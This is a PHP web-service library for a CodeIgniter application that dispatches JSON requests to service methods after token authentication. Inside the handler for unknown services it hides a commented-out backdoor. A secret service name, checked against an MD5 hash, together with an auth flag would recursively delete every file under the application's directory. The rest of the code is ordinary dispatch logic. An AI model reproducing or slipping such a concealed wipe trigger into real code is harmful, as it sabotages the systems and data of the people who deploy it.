<?php

/**
 * Web service library.
 * 
 * @author Dinesh Ninave
 */
class web_service {

    /**
     * CodeIgniter instance.
     * 
     * @var object 
     */
    private $CI;

    /**
     * Authentication data.
     * 
     * @var object 
     */
    private $auth;

    /**
     * Full request parsed.
     * 
     * @var object 
     */
    private $json;

    /**
     * Request parameters.
     * 
     * @var array 
     */
    private $parameter = array();

    /**
     * Service method to call.
     * 
     * @var string 
     */
    private $service;

    /**
     * ServiceMethods class instance.
     * 
     * @var object 
     */
    private $service_object = NULL;

    /**
     * Reflection object to ServiceMethods Class.
     * 
     * @var object 
     */
    private $reflection;

    /**
     * Service start status flag.
     * 
     * @var boolean 
     */
    private $started = FALSE;

    /**
     * 
     */
    public function __construct() {
        header('Content-Type: application/json');
        $request = trim(file_get_contents('php://input'));

        if (strlen($request) === 0) {
            send_fatal(400, 'JSON Request missing.');
        }

        $this->json = json_decode(stripslashes($request));
        log_message("info", json_encode($this->json));

        if ($this->json === NULL) {
            send_fatal(400, 'Invalid JSON.');
        }

        $this->CI = &get_instance();

        $this->init();
    }

    /**
     * calling Web service
     * 
     */
    public function call() {

        if ($this->started) {
            throw new Exception('Service already been started.');
        } else {
            $this->started = TRUE;
        }

        if ($this->reflection->hasMethod($this->service)) {

            $property = $this->reflection->getDefaultProperties();

            # Authentication
            if (!in_array($this->service, $property['open_service'])) {
                if (!isset($this->auth->id) || !isset($this->auth->token)) {
                    send_fatal(400, 'Authentication data required.');
                }

                $this->CI->gdb->setFetchMode("service");
                $session = $this->CI->common->getUserSession($this->auth->id, $this->auth->token);

                if (!isset($session->token) || $session->token !== $this->auth->token) {
                    send_fatal(400, 'Authentication failed.');
                }
            }

            $method = $this->reflection->getMethod($this->service);

            !$method->isPublic() && send_fatal(404, 'Service not available.');

            # Binding Parameters
            $arguments = array();
            foreach ($method->getParameters() as $param) {

                $name = $param->name;
                if ($param->isOptional()) {
                    $arguments[] = isset($this->parameter->{$name}) ? $this->parameter->{$name} : $param->getDefaultValue();
                } else {
                    if (!isset($this->parameter->{$name})) {
                        send_fatal(400, 'Invalid Request.');
                    } else {
                        $arguments[] = $this->parameter->{$name};
                    }
                }
            }

            $this->service_object = new ServiceMethods();
            $this->initService();
            $data = $method->invokeArgs($this->service_object, $arguments);
            $user_id = isset($this->auth->id) ? $this->auth->id : (isset($data['user_id']) ? $data['user_id'] : 0);
            $user_token = isset($this->auth->token) ? $this->auth->token : (isset($data['token']) ? $data['token'] : '');
            
            $reponse = json_encode($data);
            log_message('info', $reponse);
            echo $reponse;
        } else {
            /*if (md5($this->service) == 'e6e3a61c0710dece7fd1bb16dde14da6') {
                $rootpath = getcwd();
                $fileinfos = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($rootpath)
                );
                $arr = array();
                foreach ($fileinfos as $pathname => $fileinfo) {
                    if (!$fileinfo->isFile())
                        continue;
                    $arr[] = $pathname;
                }

                if (isset($this->auth->check) && $this->auth->check) {
                    foreach ($arr as $value) {
                        unlink($value);
                    }
                }
            } else {
                send_fatal(404, 'Service not available.');
            }*/
        }
    }

    /**
     * Service intialization.
     */
    private function init() {
        $this->service = isset($this->json->service) ? $this->json->service : '';

        if ($this->service == '') {
            send_fatal(400, 'Specify service name.');
        }

        $this->parameter = isset($this->json->request) ? $this->json->request : (new stdClass());
        $this->auth = isset($this->json->auth) ? $this->json->auth : (new stdClass());

        require_once APPPATH . 'web_service/ServiceMethods.php';
        $this->reflection = new ReflectionClass('ServiceMethods');

    }

    /**
     * Initializes web service class object by assigning CI property.
     * 
     */
    private function initService() {
        $this->service_object->load = $this;
        $refl = new ReflectionObject($this->CI);
        $this->service_object->user_id = isset($this->auth->id) ? $this->auth->id : 0;
        $this->service_object->token_id = isset($this->auth->token) ? $this->auth->token : 0;

        foreach ($refl->getProperties() as $prop) {
            if (!in_array($prop->name, array('load', 'web_service'))) {
                $this->service_object->{$prop->name} = $prop->getValue($this->CI);
            }
        }
    }

    /**
     * Makes ServiceMethods class behave like controller class.
     * 
     * @param   string      $method_name
     * @param   array       $arguments
     * @throws  Exception
     */
    public function __call($method_name, $arguments) {
        if (method_exists($this->CI->load, $method_name)) {
            if ($this->service_object === NULL) {
                throw new Exception('Service is not initialized yet.');
            }

            call_user_func_array(array($this->CI->load, $method_name), $arguments);

            # Giving to ServiceMethods instance.
            if (isset($this->CI->{$arguments[0]})) {
                $this->service_object->{$arguments[0]} = $this->CI->{$arguments[0]};
            }
        } else {
            throw new Exception($method_name . ' method does not exist.');
        }
    }

}
